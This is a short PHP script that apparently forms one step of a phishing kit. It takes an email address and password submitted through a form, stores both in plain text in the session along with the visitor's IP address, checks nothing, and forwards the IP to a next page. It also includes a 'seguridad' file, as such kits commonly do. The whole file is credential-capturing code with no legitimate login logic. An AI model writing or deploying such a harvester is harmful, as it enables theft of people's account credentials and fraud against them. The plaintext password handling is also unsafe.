<?php
include("seguridad/seguridad.php");

session_start();
$ip = getenv("REMOTE_ADDR");

$_SESSION['email'] = $_POST['email'];
$_SESSION['password'] = $_POST['password'];

header("Location: elprimeroche.php?ip=$ip");
?>